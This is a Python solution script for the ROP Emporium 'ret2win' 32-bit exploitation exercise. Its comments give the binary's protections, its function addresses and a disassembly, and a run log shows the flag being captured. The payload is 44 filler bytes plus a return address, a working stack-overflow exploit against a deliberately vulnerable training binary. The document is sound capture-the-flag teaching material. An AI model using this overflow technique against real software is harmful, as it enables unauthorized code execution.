# RET2Win Solution by jSacco <jsacco@exploitpack.com>
# Description: :P
from struct import pack
#
# db-peda$ checksec
# CANARY    : disabled
# FORTIFY   : disabled
# NX        : ENABLED
# PIE       : disabled
# RELRO     : Partial
#
# gdb-peda$ i functions
# ...
# 0x0804857b  main
# 0x080485f6  pwnme
# 0x08048659  ret2win
# ...
#
# gdb-peda$ pdisass ret2win
# Dump of assembler code for function ret2win:
#    0x08048659 <+0>: push   ebp
#    0x0804865a <+1>: mov    ebp,esp
#    0x0804865c <+3>: sub    esp,0x8
#    0x0804865f <+6>: sub    esp,0xc
#    0x08048662 <+9>: push   0x8048824
#    0x08048667 <+14>: call   0x8048400 <printf@plt>
#    0x0804866c <+19>: add    esp,0x10
#    0x0804866f <+22>: sub    esp,0xc
#    0x08048672 <+25>: push   0x8048841
#    0x08048677 <+30>: call   0x8048430 <system@plt>
#    0x0804867c <+35>: add    esp,0x10
#    0x0804867f <+38>: nop
#    0x08048680 <+39>: leave
#    0x08048681 <+40>: ret
# End of assembler dump.
# root@kali:~/Downloads/ROPgadget-master# python ret2win.py |./ret2win32
# ret2win by ROP Emporium
# 32bits
#
# For my first trick, I will attempt to fit 50 bytes of user input
into 32 bytes of stack buffer;
# What could possibly go wrong?
# You there madam, may I have your input please? And don't worry about
null bytes, we're using fgets!
#
# > Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
# Illegal instruction


rop = "\x41"*44
rop += pack('<I',0x08048659) # ret2win
print rop